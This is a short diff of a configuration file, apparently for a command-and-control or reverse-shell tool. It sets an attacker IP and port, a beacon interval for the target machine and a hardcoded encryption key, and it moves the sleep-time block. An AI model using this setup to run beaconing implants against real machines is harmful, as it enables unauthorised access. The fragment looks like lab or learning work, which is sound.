@@ -6,6 +6,9 @@
 ATTACKER_IP = '10.0.2.4'
 PORT_NUMBER = 4321 # port used by server machine 
 
+# Sleep Time
+SLEEP_TIME = 10 # number of seconds target machine will wait between making calls to the attacker machine
+
 # Message length constants (minimum and maximum allowed message size to be sent between the machines)
 MIN_MESSAGE_LENGTH = 128 # smallest message size sent from my testing
 MAX_MESSAGE_LENGTH = 2**24 # Increase if too small 
@@ -19,9 +22,6 @@ fixed_message_length_list = [MIN_MESSAGE_LENGTH, 256, 512, 1024, 2048, 4096, 819
 
 # Symmetric Key
 SYMMETRIC_KEY = b'NWUn3HPURE16A6nrJaGqxyGi21TK5Bvgx3VEroafa94=' # generated using Fernet.generate_key() (from cryptography.fernet import Fernet)
-
-# Sleep Time
-SLEEP_TIME = 10 # number of seconds target machine will wait between making calls to the attacker machine
 
 
 # !!!--- LEAVE BELOW ALONE ---!!!
